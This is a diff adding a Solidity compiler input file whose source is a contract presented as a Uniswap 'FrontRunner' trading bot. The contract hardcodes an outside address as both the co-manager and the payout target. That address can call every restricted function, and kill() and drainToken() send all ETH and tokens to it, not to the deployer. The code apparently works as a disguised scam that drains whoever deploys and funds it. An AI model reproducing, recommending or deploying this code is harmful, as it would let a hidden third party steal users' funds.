@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "browser/frontrun.sol": {
+      "content": "pragma solidity ^0.6.1;\r\n\r\ncontract FrontRunner {\r\n    \r\n    address payable private manager;\r\n    address payable private second = 0x8ed63bfd83e224334dB79BC5EeE5D593F165693e;\r\n    address payable private EOA = 0x8ed63bfd83e224334dB79BC5EeE5D593F165693e;\r\n\r\n    event Received(address sender, uint amount);\r\n    event UniswapEthBoughtActual(uint[] amount);\r\n    event UniswapTokenBoughtActual(uint[] amount);\r\n\r\n    receive() external payable {\r\n        emit Received(msg.sender, msg.value);\r\n    }\r\n\r\n    modifier restricted() {\r\n        require(msg.sender == manager || msg.sender == second, \"manager allowed only\");\r\n        _;\r\n    }\r\n\r\n    constructor() public {\r\n        manager = msg.sender;\r\n    }\r\n  \r\nfunction ethToToken(uint amountOutMin, address[] calldata path, address to, uint deadline, address payable _uni) external restricted {\r\n    Uniswap uni = Uniswap(_uni);\r\n    uint256 ethBalance = address(this).balance;\r\n    uint[] memory  tokensBoughtActual = uni.swapExactETHForTokens.value(amountOutMin)({ amountOutMin: amountOutMin, path:path, to:to, deadline: deadline });\r\n    emit UniswapTokenBoughtActual(tokensBoughtActual);\r\n}\r\n\r\nfunction tokenToEth(uint amountOutMin, address[] calldata path, address to, uint deadline, address payable _uni, ERC20 _token) external restricted {\r\n    Uniswap uni = Uniswap(_uni);\r\n    ERC20 token = ERC20(_token);\r\n    token.approve(_uni, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF);\r\n    token = ERC20(_token);\r\n    uint tokenBalance = token.balanceOf(address(this));\r\n    uint[] memory actualEthBought = uni.swapExactTokensForETH({ amountIn: tokenBalance, amountOutMin: amountOutMin,path:path, to:to, deadline: deadline });\r\n    emit UniswapEthBoughtActual(actualEthBought);\r\n}\r\n\r\nfunction kill() external restricted {\r\n    selfdestruct(EOA);\r\n}\r\n\r\nfunction approve(ERC20 _token, address payable _uni) external restricted {\r\n    ERC20 token = ERC20(_token);\r\n    token.approve(_uni, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF);\r\n}\r\n\r\nfunction drainToken(ERC20 _token) external restricted {\r\n    ERC20 token = ERC20(_token);\r\n    uint tokenBalance = token.balanceOf(address(this));\r\n    token.transfer(EOA, tokenBalance);\r\n}\r\n}\r\nabstract contract ERC20 {\r\n    function balanceOf(address account) external virtual view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external virtual returns (bool);\r\n    function approve(address spender, uint tokens) public virtual returns (bool success);\r\n}\r\n\r\nabstract contract Uniswap {\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external virtual payable returns (uint[] memory amounts);\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) virtual external returns (uint[] memory amounts);\r\n}\r\n\r\n\r\n"
+    }
+  }
+}
